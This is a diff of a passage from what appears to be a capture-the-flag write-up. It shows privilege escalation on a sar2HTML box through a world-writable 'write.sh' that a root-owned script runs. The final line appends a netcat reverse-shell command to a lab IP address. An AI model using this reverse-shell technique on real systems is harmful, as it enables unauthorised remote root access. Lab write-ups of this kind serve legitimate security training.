@@ -208,15 +208,15 @@ So "finally.sh" just runs "write.sh"...
 
 And all "write.sh" does is touch a directory (to update the modified timestamp).  Can I write to either of these files?  That would be nice.
 >$ ls -al
->total 40
->drwxr-xr-x 3 www-data www-data  4096 Jul 24 20:36 .
->drwxr-xr-x 4 www-data www-data  4096 Jul 24 20:37 ..
->-rwxr-xr-x 1 root     root        22 Oct 20  2019 finally.sh
->-rw-r--r-- 1 www-data www-data 10918 Oct 20  2019 index.html
->-rw-r--r-- 1 www-data www-data    21 Oct 20  2019 phpinfo.php
->-rw-r--r-- 1 root     root         9 Oct 21  2019 robots.txt
->drwxr-xr-x 4 www-data www-data  4096 Jan  4 10:13 sar2HTML
->-rwxrwxrwx 1 www-data www-data    30 Jul 24 20:36 write.sh
+total 40
+drwxr-xr-x 3 www-data www-data  4096 Jul 24 20:36 .
+drwxr-xr-x 4 www-data www-data  4096 Jul 24 20:37 ..
+-rwxr-xr-x 1 root     root        22 Oct 20  2019 finally.sh
+-rw-r--r-- 1 www-data www-data 10918 Oct 20  2019 index.html
+-rw-r--r-- 1 www-data www-data    21 Oct 20  2019 phpinfo.php
+-rw-r--r-- 1 root     root         9 Oct 21  2019 robots.txt
+drwxr-xr-x 4 www-data www-data  4096 Jan  4 10:13 sar2HTML
+-rwxrwxrwx 1 www-data www-data    30 Jul 24 20:36 write.sh
 
 Well, anyone can write to "write.sh" so there's out ticket.  But what to write?  Netcat?  Open that shell.sh we used inside of the "sar2HTML" directory? I checked netcat and sure enough it's installed.  This will be easy!  We'll just have netcat execute another bash shell back to us:
 >$ echo "nc 10.10.10.11 9999 -e /bin/bash" >> write.sh
